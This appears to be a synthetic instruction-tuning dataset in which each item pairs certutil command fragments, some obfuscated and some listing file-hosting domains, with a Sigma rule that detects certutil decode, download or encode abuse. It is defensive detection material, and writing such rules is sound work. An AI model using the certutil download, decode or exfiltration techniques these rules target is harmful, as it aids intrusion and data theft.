selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash:\n            - '-decode ' # Decode Base64\n            - '-decodehex ' # Decode Hex\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe \\\"-\\\"\\\"d\\\"\\\"e\\\"\\\"c\\\"\\\"o\\\"\\\"d\\\"\\\"e\\\" -decodehex", "output": "title: File Decoded From Base64/Hex Via Certutil.EXE\nid: cc9cbe82-7bc0-4ef5-bc23-bbfb83947be7\nstatus: test\ndescription: Detects the execution of certutil with either the \"decode\" or \"decodehex\" flags to decode base64 or hex encoded files. This can be abused by attackers to decode an encoded payload before execution\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\n    - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/\n    - https://twitter.com/JohnLaTwC/status/835149808817991680\n    - https://learn.microsoft.com/en-us/archive/blogs/pki/basic-crl-checking-with-certutil\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2023-02-15\nmodified: 2025-06-04\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash:\n            - '-decode ' # Decode Base64\n            - '-decodehex ' # Decode Hex\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe --decode --decodehex", "output": "title: File Decoded From Base64/Hex Via Certutil.EXE\nid: cc9cbe82-7bc0-4ef5-bc23-bbfb83947be7\nstatus: test\ndescription: Detects the execution of certutil with either the \"decode\" or \"decodehex\" flags to decode base64 or hex encoded files. This can be abused by attackers to decode an encoded payload before execution\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\n    - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/\n    - https://twitter.com/JohnLaTwC/status/835149808817991680\n    - https://learn.microsoft.com/en-us/archive/blogs/pki/basic-crl-checking-with-certutil\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2023-02-15\nmodified: 2025-06-04\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash:\n            - '-decode ' # Decode Base64\n            - '-decodehex ' # Decode Hex\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil CertUtil -decode -decodehex", "output": "title: File Decoded From Base64/Hex Via Certutil.EXE\nid: cc9cbe82-7bc0-4ef5-bc23-bbfb83947be7\nstatus: test\ndescription: Detects the execution of certutil with either the \"decode\" or \"decodehex\" flags to decode base64 or hex encoded files. This can be abused by attackers to decode an encoded payload before execution\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\n    - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/\n    - https://twitter.com/JohnLaTwC/status/835149808817991680\n    - https://learn.microsoft.com/en-us/archive/blogs/pki/basic-crl-checking-with-certutil\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2023-02-15\nmodified: 2025-06-04\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash:\n            - '-decode ' # Decode Base64\n            - '-decodehex ' # Decode Hex\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe -decode -decodehex CertUtil.exe", "output": "title: File Decoded From Base64/Hex Via Certutil.EXE\nid: cc9cbe82-7bc0-4ef5-bc23-bbfb83947be7\nstatus: test\ndescription: Detects the execution of certutil with either the \"decode\" or \"decodehex\" flags to decode base64 or hex encoded files. This can be abused by attackers to decode an encoded payload before execution\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\n    - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/\n    - https://twitter.com/JohnLaTwC/status/835149808817991680\n    - https://learn.microsoft.com/en-us/archive/blogs/pki/basic-crl-checking-with-certutil\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2023-02-15\nmodified: 2025-06-04\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash:\n            - '-decode ' # Decode Base64\n            - '-decodehex ' # Decode Hex\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe urlcache verifyctl http", "output": "title: Suspicious Download Via Certutil.EXE\nid: 19b08b1c-861d-4e75-a1ef-ea0c1baf202b\nrelated:\n    - id: 13e6fe51-d478-4c7e-b0f2-6da9b400a829\n      type: similar\nstatus: test\ndescription: Detects the execution of certutil with certain flags that allow the utility to download files.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://forensicitguy.github.io/agenttesla-vba-certutil-download/\n    - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/\n    - https://twitter.com/egre55/status/1087685529016193025\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_flags:\n        CommandLine|contains:\n            - 'urlcache '\n            - 'verifyctl '\n    selection_http:\n        CommandLine|contains: 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\certutil.exe\\\" CertUtil.exe urlcache verifyctl http", "output": "title: Suspicious Download Via Certutil.EXE\nid: 19b08b1c-861d-4e75-a1ef-ea0c1baf202b\nrelated:\n    - id: 13e6fe51-d478-4c7e-b0f2-6da9b400a829\n      type: similar\nstatus: test\ndescription: Detects the execution of certutil with certain flags that allow the utility to download files.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://forensicitguy.github.io/agenttesla-vba-certutil-download/\n    - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/\n    - https://twitter.com/egre55/status/1087685529016193025\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_flags:\n        CommandLine|contains:\n            - 'urlcache '\n            - 'verifyctl '\n    selection_http:\n        CommandLine|contains: 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil CertUtil urlcache verifyctl http", "output": "title: Suspicious Download Via Certutil.EXE\nid: 19b08b1c-861d-4e75-a1ef-ea0c1baf202b\nrelated:\n    - id: 13e6fe51-d478-4c7e-b0f2-6da9b400a829\n      type: similar\nstatus: test\ndescription: Detects the execution of certutil with certain flags that allow the utility to download files.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://forensicitguy.github.io/agenttesla-vba-certutil-download/\n    - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/\n    - https://twitter.com/egre55/status/1087685529016193025\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_flags:\n        CommandLine|contains:\n            - 'urlcache '\n            - 'verifyctl '\n    selection_http:\n        CommandLine|contains: 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe urlcache verifyctl CertUtil.exe http", "output": "title: Suspicious Download Via Certutil.EXE\nid: 19b08b1c-861d-4e75-a1ef-ea0c1baf202b\nrelated:\n    - id: 13e6fe51-d478-4c7e-b0f2-6da9b400a829\n      type: similar\nstatus: test\ndescription: Detects the execution of certutil with certain flags that allow the utility to download files.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://forensicitguy.github.io/agenttesla-vba-certutil-download/\n    - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/\n    - https://twitter.com/egre55/status/1087685529016193025\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_flags:\n        CommandLine|contains:\n            - 'urlcache '\n            - 'verifyctl '\n    selection_http:\n        CommandLine|contains: 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe urlcache verifyctl ://1 ://2 ://3 ://4 ://5 ://6 ://7 ://8 ://9 ://7-", "output": "title: Suspicious Download Via Certutil.EXE\nid: 19b08b1c-861d-4e75-a1ef-ea0c1baf202b\nrelated:\n    - id: 13e6fe51-d478-4c7e-b0f2-6da9b400a829\n      type: similar\nstatus: test\ndescription: Detects the execution of certutil with certain flags that allow the utility to download files.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://forensicitguy.github.io/agenttesla-vba-certutil-download/\n    - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/\n    - https://twitter.com/egre55/status/1087685529016193025\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_flags:\n        CommandLine|contains:\n            - 'urlcache '\n            - 'verifyctl '\n    selection_http:\n        CommandLine|contains: 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe \\\"CertUtil.exe\\\" \\\"urlcache\\\" verifyctl ://1 ://2 ://3 ://4 ://5 ://6 ://7 ://8 ://9 ://7-", "output": "title: Suspicious Download Via Certutil.EXE\nid: 19b08b1c-861d-4e75-a1ef-ea0c1baf202b\nrelated:\n    - id: 13e6fe51-d478-4c7e-b0f2-6da9b400a829\n      type: similar\nstatus: test\ndescription: Detects the execution of certutil with certain flags that allow the utility to download files.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://forensicitguy.github.io/agenttesla-vba-certutil-download/\n    - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/\n    - https://twitter.com/egre55/status/1087685529016193025\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_flags:\n        CommandLine|contains:\n            - 'urlcache '\n            - 'verifyctl '\n    selection_http:\n        CommandLine|contains: 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil CertUtil urlcache verifyctl ://1 ://2 ://3 ://4 ://5 ://6 ://7 ://8 ://9 ://7-", "output": "title: Suspicious Download Via Certutil.EXE\nid: 19b08b1c-861d-4e75-a1ef-ea0c1baf202b\nrelated:\n    - id: 13e6fe51-d478-4c7e-b0f2-6da9b400a829\n      type: similar\nstatus: test\ndescription: Detects the execution of certutil with certain flags that allow the utility to download files.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://forensicitguy.github.io/agenttesla-vba-certutil-download/\n    - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/\n    - https://twitter.com/egre55/status/1087685529016193025\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_flags:\n        CommandLine|contains:\n            - 'urlcache '\n            - 'verifyctl '\n    selection_http:\n        CommandLine|contains: 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe urlcache verifyctl ://1 ://2 ://3 ://4 ://5 ://6 ://7 ://8 ://9 ://7-", "output": "title: Suspicious Download Via Certutil.EXE\nid: 19b08b1c-861d-4e75-a1ef-ea0c1baf202b\nrelated:\n    - id: 13e6fe51-d478-4c7e-b0f2-6da9b400a829\n      type: similar\nstatus: test\ndescription: Detects the execution of certutil with certain flags that allow the utility to download files.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://forensicitguy.github.io/agenttesla-vba-certutil-download/\n    - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/\n    - https://twitter.com/egre55/status/1087685529016193025\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_flags:\n        CommandLine|contains:\n            - 'urlcache '\n            - 'verifyctl '\n    selection_http:\n        CommandLine|contains: 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe urlcache verifyctl .githubusercontent.com anonfiles.com cdn.discordapp.com ddns.net dl.dropboxusercontent.com ghostbin.co glitch.me gofile.io hastebin.com mediafire.com mega.nz onrender.com pages.dev paste.ee pastebin.com pastebin.pl pastetext.net privatlab.com privatlab.net send.exploit.in sendspace.com storage.googleapis.com storjshare.io supabase.co temp.sh transfer.sh trycloudflare.com ufile.io w3spaces.com workers.dev", "output": "title: Suspicious Download Via Certutil.EXE\nid: 19b08b1c-861d-4e75-a1ef-ea0c1baf202b\nrelated:\n    - id: 13e6fe51-d478-4c7e-b0f2-6da9b400a829\n      type: similar\nstatus: test\ndescription: Detects the execution of certutil with certain flags that allow the utility to download files.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://forensicitguy.github.io/agenttesla-vba-certutil-download/\n    - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/\n    - https://twitter.com/egre55/status/1087685529016193025\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_flags:\n        CommandLine|contains:\n            - 'urlcache '\n            - 'verifyctl '\n    selection_http:\n        CommandLine|contains: 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe urlcache verifyctl .githubusercontent.com anonfiles.com cdn.discordapp.com ddns.net dl.dropboxusercontent.com ghostbin.co glitch.me gofile.io hastebin.com mediafire.com mega.nz onrender.com pages.dev paste.ee pastebin.com pastebin.pl pastetext.net privatlab.com privatlab.net \"send.ex\"ploit.in sendspace.com storage.googleapis.com storjshare.io supabase.co temp.sh transfer.sh trycloudflare.com ufile.io w3spaces.com workers.dev", "output": "title: Suspicious Download Via Certutil.EXE\nid: 19b08b1c-861d-4e75-a1ef-ea0c1baf202b\nrelated:\n    - id: 13e6fe51-d478-4c7e-b0f2-6da9b400a829\n      type: similar\nstatus: test\ndescription: Detects the execution of certutil with certain flags that allow the utility to download files.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://forensicitguy.github.io/agenttesla-vba-certutil-download/\n    - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/\n    - https://twitter.com/egre55/status/1087685529016193025\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_flags:\n        CommandLine|contains:\n            - 'urlcache '\n            - 'verifyctl '\n    selection_http:\n        CommandLine|contains: 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil CertUtil urlcache verifyctl .githubusercontent.com anonfiles.com cdn.discordapp.com ddns.net dl.dropboxusercontent.com ghostbin.co glitch.me gofile.io hastebin.com mediafire.com mega.nz onrender.com pages.dev paste.ee pastebin.com pastebin.pl pastetext.net privatlab.com privatlab.net send.exploit.in sendspace.com storage.googleapis.com storjshare.io supabase.co temp.sh transfer.sh trycloudflare.com ufile.io w3spaces.com workers.dev", "output": "title: Suspicious Download Via Certutil.EXE\nid: 19b08b1c-861d-4e75-a1ef-ea0c1baf202b\nrelated:\n    - id: 13e6fe51-d478-4c7e-b0f2-6da9b400a829\n      type: similar\nstatus: test\ndescription: Detects the execution of certutil with certain flags that allow the utility to download files.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://forensicitguy.github.io/agenttesla-vba-certutil-download/\n    - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/\n    - https://twitter.com/egre55/status/1087685529016193025\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_flags:\n        CommandLine|contains:\n            - 'urlcache '\n            - 'verifyctl '\n    selection_http:\n        CommandLine|contains: 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe urlcache verifyctl .githubusercontent.com anonfiles.com cdn.discordapp.com ddns.net dl.dropboxusercontent.com ghostbin.co glitch.me gofile.io hastebin.com mediafire.com mega.nz onrender.com pages.dev paste.ee pastebin.com pastebin.pl pastetext.net privatlab.com privatlab.net send.exploit.in sendspace.com storage.googleapis.com storjshare.io supabase.co temp.sh transfer.sh trycloudflare.com ufile.io w3spaces.com workers.dev", "output": "title: Suspicious Download Via Certutil.EXE\nid: 19b08b1c-861d-4e75-a1ef-ea0c1baf202b\nrelated:\n    - id: 13e6fe51-d478-4c7e-b0f2-6da9b400a829\n      type: similar\nstatus: test\ndescription: Detects the execution of certutil with certain flags that allow the utility to download files.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://forensicitguy.github.io/agenttesla-vba-certutil-download/\n    - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/\n    - https://twitter.com/egre55/status/1087685529016193025\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_flags:\n        CommandLine|contains:\n            - 'urlcache '\n            - 'verifyctl '\n    selection_http:\n        CommandLine|contains: 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe -encode", "output": "title: File Encoded To Base64 Via Certutil.EXE\nid: e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a\nstatus: test\ndescription: Detects the execution of certutil with the \"encode\" flag to encode a file to base64. This can be abused by threat actors and attackers for data exfiltration\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-02-24\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash: '-encode'\n    condition: all of selection_*\nfalsepositives:\n    - As this is a general purpose rule, legitimate usage of the encode functionality will trigger some false positives. Apply additional filters accordingly\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe \\\"-\\\"\\\"e\\\"\\\"n\\\"\\\"c\\\"\\\"o\\\"\\\"d\\\"\\\"e\\\"", "output": "title: File Encoded To Base64 Via Certutil.EXE\nid: e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a\nstatus: test\ndescription: Detects the execution of certutil with the \"encode\" flag to encode a file to base64. This can be abused by threat actors and attackers for data exfiltration\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-02-24\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash: '-encode'\n    condition: all of selection_*\nfalsepositives:\n    - As this is a general purpose rule, legitimate usage of the encode functionality will trigger some false positives. Apply additional filters accordingly\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe --encode", "output": "title: File Encoded To Base64 Via Certutil.EXE\nid: e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a\nstatus: test\ndescription: Detects the execution of certutil with the \"encode\" flag to encode a file to base64. This can be abused by threat actors and attackers for data exfiltration\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-02-24\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash: '-encode'\n    condition: all of selection_*\nfalsepositives:\n    - As this is a general purpose rule, legitimate usage of the encode functionality will trigger some false positives. Apply additional filters accordingly\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe -encode CertUtil.exe", "output": "title: File Encoded To Base64 Via Certutil.EXE\nid: e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a\nstatus: test\ndescription: Detects the execution of certutil with the \"encode\" flag to encode a file to base64. This can be abused by threat actors and attackers for data exfiltration\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-02-24\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash: '-encode'\n    condition: all of selection_*\nfalsepositives:\n    - As this is a general purpose rule, legitimate usage of the encode functionality will trigger some false positives. Apply additional filters accordingly\nlevel: medium"}
